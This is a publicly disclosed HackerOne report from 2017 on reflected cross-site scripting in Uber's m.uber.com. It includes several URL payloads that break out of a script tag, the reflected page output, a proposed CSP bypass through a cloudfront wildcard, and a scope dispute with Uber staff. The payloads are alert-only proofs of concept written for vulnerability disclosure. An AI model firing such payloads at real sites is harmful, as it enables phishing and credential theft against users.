---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/cross-site-scripting-xss-reflected
  - env/web
substate: "duplicate"
weakness: "Cross-site Scripting (XSS) - Reflected"
enriched: true
body: true
date: 2017-12-26
submitted: 2017-12-10T18:06:43.055Z
bounty_usd: null
votes: 3
cve: []
program: "[[programs/uber|Uber]]"
reporter: "gregoryvperry"
source: "https://hackerone.com/reports/296701"
title: "SSL-protected Reflected XSS in m.uber.com"
---
# SSL-protected Reflected XSS in m.uber.com

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 3 | **Program:** Uber | **Disclosed:** 2017-12-26

- Report: [https://hackerone.com/reports/296701](https://hackerone.com/reports/296701)
- CWE: Cross-site Scripting (XSS) - Reflected
- Submitted: 2017-12-10T18:06:43.055Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary
m.uber.com is susceptible to reflected XSS

## Security Impact
A malformed URL can be used to render arbitrary SSL-protected web pages from m.uber.com

## Reproduction Steps
https://m.uber.com/?bjbxm%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3exrii5=1

## Specifics
From the rendered web page:
```
{"enabled":true,"sid":"bbc661585c424072","url":"www.cdn-net.com","cf":1022963},"queryParams":{"bjbxm</script><script>alert(1)</script>xrii5":"1"}
```
No further efforts were made to render a more believable webpage as the vulnerability and reflected code above is sufficient to trigger Chromium Browser's XSS _Auditor protections.

## Impact

An attacker could render arbitrary SSL-protected web pages from m.uber.com, to capture user login credentials and passwords, credit card numbers and related payment information, etc.

## Timeline

- **Report Filed**
- **2017-12-11** @fletcher: We'll take a look and follow-up when we've got more details.
- **Report Needs More Info**
- **Report New**
- **2017-12-15** @gregoryvperry: Is uberinternal.com in scope for testing. It frequently shows up in various uber.com domains but is not specifically referenced as in scope for the Uber Bug Bounty.
- **2017-12-15** @fletcher: Sounds good -- we'll keep an eye out for the new PoC.

For scope details, we focus on security impact buckets -- if a given vulnerability report lands in one of those buckets (and doesn't have mitigating factors that result in security impact being negligible) they are in-scope. We have a small list of out-of-scope domains, but we don't define a list of in-scope domains as we believe that model isn't an accurate way to understand the security impact of any given report.
- **2017-12-19** @gregoryvperry: I am not seeing how quotes are escaped at this https://m.uber.com endpoint. In fact, any arbitrary input can be reflected after the query string and I've been able to close out the originating script with a crafted urlencoded </script> tag. I have not yet been able to generate an alert which may be due to content sniffing in the browser, but I don't think so as the page itself is content type text/html. Don't close out this report as I am still working on some other options.
- **2017-12-22** @gregoryvperry: m.uber.com is definitely vulnerable. Although the page has content sniffing enabled, the content type is text/html which gives me the ability to inject a </script> tag into the query string followed by rendering of arbitrary javascript and/or html.

https://m.uber.com/?</ScrIpt><script>alert(1)</script> 
https://m.uber.com/?</ScrIpt><script>(/X/)</script>

generates a javascript popup in Trident and Webkit-based browsers, triggers XSS_Auditor in Chrome, triggers Internet Explorer's XSS protections, and is being rendered in the resulting html document without any escaping:
```
{"fb":"lite:os6DDzUYcFwRIHl9FUCbrBhmasr78yA9"},"fbAppId":"277064115737714","fbSDKVersion":"v2.6","deferredSignUp":true,"enabledFeatures":{"promotionsEnabled":true},"pageCreatedAt":1513958970175,"uditoken":{"enabled":true,"sid":"bbc661585c424072","url":"www.cdn-net.com","cf":1022963},"queryParams":{"</ScrIpt><script>(/X/)</script>":""},"useragent":{"ua":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 
```
- **2017-12-22** @gregoryvperry: m.uber.com also has script-src set which can be bypassed due to the *.cloudfront.net wildcard (I could simply enable Cloudfront in my AWS console and then inject files from the *.cloudfront.net host I control), in addition to a missing base-uri which are both considered high severity findings under Content Security Policy 3.
- **2017-12-22** @gregoryvperry: Another valid payload:

https://m.uber.com/?%3C/ScrIpt%3E%3Cscript%3E(/X/)%3C/script%3E

Resulting in:

```
ledFeatures":{"promotionsEnabled":true},"pageCreatedAt":1513960039898,"uditoken":{"enabled":true,"sid":"bbc661585c424072","url":"www.cdn-net.com","cf":1022963},"queryParams":{"\"></script><script>/*\"/*'/**/;alert(1)//</script>":""},"useragent":{"ua":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 
```

Valid </script> with arbitrary javascript injection that is not escaped.
- **2017-12-22** @gregoryvperry: Another valid payload:

https://m.uber.com/?"></script "/*'/*><img/src=x */; onerror=alert(1) //

Resulting in:

```
{"enabled":true,"sid":"bbc661585c424072","url":"www.cdn-net.com","cf":1022963},"queryParams":{"\"></script \"/*'/*><img/src":"x */; onerror=alert(1) //"},"useragent":{"ua":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0","browser":
```
- **2017-12-22** @lindsey-uber: Thanks for another one, @gregperry. We're looking into this now and will follow up as we have more details.
- **2017-12-22** @gregoryvperry: This application's XSS filtering attempts to escape double quotes, but allows single quotes which is valid html.

Here is an example of generating some arbitrary text using single quotes, all SSL-encrypted with Uber's signed certificate, and without Chrome's XSS_Auditor triggering:

https://m.uber.com/?asdf"}}</script><div%20class%3D%27_b%20_c%20_d%20_e%20_f%20_g%20_h%20_i%20_a3%20_a4%20_a5%20_a6%20_a7%20_a8%20_a9%20_aa%20_ab%20_ac%20_ad%20_ae%20_af%20_ag%20_ah%20_ai%20_aj%20_ak%20_al%20_am%20_an%20_ao%20_ap%20_aq%20_ar%20_as%20_at%20_au%20_av%20_aw%27><a%20href%3D"http%3A%2F%2Fwww.lyft.com">Some%20arbitrary%20link%20text<%2Fa><%2Fdiv>%0A

I trust this issue, at the very least, is now validated as a critical security vulnerability.
- **2017-12-22** @fletcher: We'll take a look into this one more time, but so far this is not a security bug that is in scope -- you've failed to demonstrate Javascript execution in a modern browser and the other behavior you allude to with "generating some arbitrary text using single quotes" sounds like simple content injection, which is out of scope for our program.

Please refrain from making theoretical arguments for why something has security impact and instead familiarize yourself with our scope page and demonstrate actual security impact that is in scope per our guidelines.
- **2017-12-22** @gregoryvperry: Hello Rob,

This is reflected XSS, and certainly in scope. For example, here is the Uber sample report:

```
## Summary
reflected XSS in partners.uber.com

## Security Impact
Since partners.uber.com has an authenticated experience, an XSS in this domain
means an attacker can forge authenticated requests on behalf of the victim.
Also, advanced phishing attacks and defacement are possible.

## Reproduction Steps
This is a reflected XSS in `partners.uber.com/ via the `lang` querystring
parameter via the route `/documents`.
```
This particular issue is almost word-for-word the same as your sample vulnerability report, with a POC that executes arbitrary html from an SSL-protected Uber website, so I don't know how you could possibly say this is not in scope unless you are just engaging in blatant employment discrimination at this point.
- **2017-12-22** @fletcher: It's not XSS if you can't get Javascript to execute -- we're verifying your most recent payloads to see if they fire Javascript and will go from there.
- **2017-12-22** @gregoryvperry: Hello Rob,

An XSS attack is not strictly constrained to javascript, and I've demonstrated the ability to render arbitrary html that is protected by an Uber-signed SSL certificate, a critical vulnerability in the various m.uber.com endpoints that could be used to harvest privileged information from Uber customers and drivers.

Some various well accepted industry definitions for what constitutes Cross Site Scripting:

https://www.webopedia.com/TERM/X/XSS.html "Common languages used for XSS include JavaScript, VBScript, HTML, Perl, C++, ActiveX and Flash."
https://en.wikipedia.org/wiki/Cross-site_scripting "The definition gradually expanded to encompass other modes of code injection, including persistent and non-JavaScript vectors (including ActiveX, Java, VBScript, Flash, or even HTML scripts), causing some confusion to newcomers to the field of information security."
https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Reflected_XSS_.28AKA_Non-Persistent_or_Type_II.29 "Server XSS occurs when untrusted user supplied data is included in an HTML response generated by the server. The source of this data could be from the request, or from a stored location. As such, you can have both Reflected Server XSS and Stored Server XSS."

etc.
- **Report Duplicate**
- **Comments Closed**
- **Agreed On Going Public**
- **Manually Disclosed**
